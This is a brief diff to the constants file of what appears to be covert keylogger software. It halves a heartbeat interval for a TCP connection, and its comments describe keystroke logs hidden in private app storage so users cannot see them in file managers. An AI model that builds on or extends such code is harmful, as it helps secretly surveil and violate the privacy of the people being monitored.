@@ -7,7 +7,7 @@ public class Constants {
     public static final int    TCP_PORT = 21400;
 
     public static final int TCP_RECONNECT_DELAY = 3000;
-    public static final int HEARTBEAT_INTERVAL  = 20000;
+    public static final int HEARTBEAT_INTERVAL  = 10000;
 
     // ========== KEYLOGGER STORAGE ==========
     // Hidden inside app's private internal data (not visible in file managers)
